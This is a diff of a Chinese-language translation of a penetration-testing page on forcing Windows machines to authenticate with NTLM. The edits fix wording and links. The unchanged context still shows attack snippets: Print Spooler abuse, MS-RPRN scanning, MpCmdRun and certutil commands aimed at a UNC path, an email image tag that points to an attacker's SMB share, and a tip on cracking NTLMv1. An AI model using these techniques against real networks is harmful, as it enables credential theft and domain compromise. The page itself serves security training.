@@ -8,8 +8,8 @@
 
 ## Spooler Service Abuse
 
-如果 _**Print Spooler**_ 服务 **启用，** 您可以使用一些已知的 AD 凭据 **请求** 域控制器的打印服务器更新新打印作业，并告诉它 **将通知发送到某个系统**。\
-请注意，当打印机将通知发送到任意系统时，它需要 **对该系统进行认证**。因此，攻击者可以使 _**Print Spooler**_ 服务对任意系统进行认证，并且该服务将在此认证中 **使用计算机账户**。
+如果 _**Print Spooler**_ 服务 **启用**，您可以使用一些已知的 AD 凭据向域控制器的打印服务器 **请求** 新打印作业的 **更新**，并告诉它 **将通知发送到某个系统**。\
+请注意，当打印机将通知发送到任意系统时，它需要 **对该系统进行认证**。因此，攻击者可以使 _**Print Spooler**_ 服务对任意系统进行认证，而该服务将在此认证中 **使用计算机账户**。
 
 ### 在域中查找 Windows 服务器
 
@@ -19,12 +19,12 @@ Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (Operati
 ```
 ### 查找监听的Spooler服务
 
-使用稍微修改过的@mysmartlogin（Vincent Le Toux）的[SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket)，查看Spooler服务是否在监听：
+使用稍微修改过的@mysmartlogin（Vincent Le Toux）的 [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket)，查看Spooler服务是否在监听：
 ```bash
 . .\Get-SpoolStatus.ps1
 ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
 ```
-您还可以在 Linux 上使用 rpcdump.py 并查找 MS-RPRN 协议。
+您还可以在Linux上使用rpcdump.py并查找MS-RPRN协议。
 ```bash
 rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
 ```
@@ -57,7 +57,7 @@ https://github.com/p0dalirius/Coercer
 
 ## 在Windows内部
 
-如果您已经在Windows机器内部，可以使用特权帐户强制Windows连接到服务器，方法是：
+如果您已经在Windows机器内部，可以使用以下方法强制Windows使用特权帐户连接到服务器：
 
 ### Defender MpCmdRun
 ```bash
@@ -90,7 +90,7 @@ certutil.exe -syncwithWU  \\127.0.0.1\share
 
 ### 通过电子邮件
 
-如果你知道想要攻陷的机器上用户的 **电子邮件地址**，你可以给他发送一封 **带有 1x1 图像** 的电子邮件，例如
+如果你知道想要攻陷的机器上用户的 **电子邮件地址**，你可以直接给他发送一封 **带有 1x1 图像** 的电子邮件，例如
 ```html
 <img src="\\10.10.17.231\test.ico" height="1" width="1" />
 ```
@@ -104,7 +104,7 @@ certutil.exe -syncwithWU  \\127.0.0.1\share
 ```
 ## 破解 NTLMv1
 
-如果你能捕获 [NTLMv1 挑战，请阅读如何破解它们](../ntlm/#ntlmv1-attack)。\
+如果你能捕获 [NTLMv1 挑战，请阅读如何破解它们](../ntlm/index.html#ntlmv1-attack)。\
 &#xNAN;_&#x52;请记住，为了破解 NTLMv1，你需要将 Responder 挑战设置为 "1122334455667788"_
 
 {{#include ../../banners/hacktricks-training.md}}
